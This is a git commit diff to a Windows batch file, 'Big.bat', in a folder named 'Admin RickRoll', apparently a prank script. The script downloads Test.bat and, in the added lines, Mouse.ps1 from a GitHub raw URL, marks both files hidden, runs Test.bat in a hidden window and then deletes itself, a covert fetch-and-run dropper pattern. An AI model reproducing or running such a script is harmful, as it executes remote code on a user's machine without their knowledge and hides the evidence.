3fb4b3c17738fc59fd6701f74238f622abfd9eb7
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-07-27 10:33:38 +0800

    Update Big.bat

--- Admin RickRoll/Big.bat
+++ Admin RickRoll/Big.bat
@@ -1,7 +1,9 @@
 @echo on
 cd C:%homepath%\Downloads
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Test.bat' -OutFile .\Test.bat
+Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Mouse.ps1' -OutFile .\Mouse.ps1
 attrib +h Test.bat
+attrib +h mouse.ps1
 powershell start .\Test.bat -windowstyle hidden
 cd /D "%~dp0"
 del Big.bat
